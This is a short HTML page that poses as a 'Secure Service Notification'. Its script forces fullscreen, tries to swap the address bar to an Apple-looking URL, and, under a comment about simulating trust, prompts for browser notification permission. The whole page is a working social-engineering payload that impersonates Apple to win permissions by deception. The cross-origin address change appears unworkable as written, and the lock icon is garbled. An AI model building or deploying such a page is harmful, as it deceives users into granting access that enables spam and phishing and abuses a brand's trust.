<!DOCTYPE html>
<html>
<head>
  <title>Loading Secure Content</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: -apple-system, sans-serif;
      height: 100%;
      overflow: hidden;
    }
    .screen {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    button {
      font-size: 16px;
      padding: 12px 24px;
    }
  </style>
</head>
<body>

<div class="screen">
  <h2>ðŸ”’ Secure Service Notification</h2>
  <p>Click to continue setup</p>
  <button onclick="begin()">Continue</button>
</div>

<script>
function begin() {
  document.documentElement.requestFullscreen().then(() => {
    history.replaceState({}, "", "https://trusted.apple.com/notification");

    // Delay to simulate trust, then request native prompt
    setTimeout(() => {
      Notification.requestPermission().then(() => {
        alert("Notifications enabled for your account.");
      });
    }, 1000);
  });
}
</script>

</body>
</html>
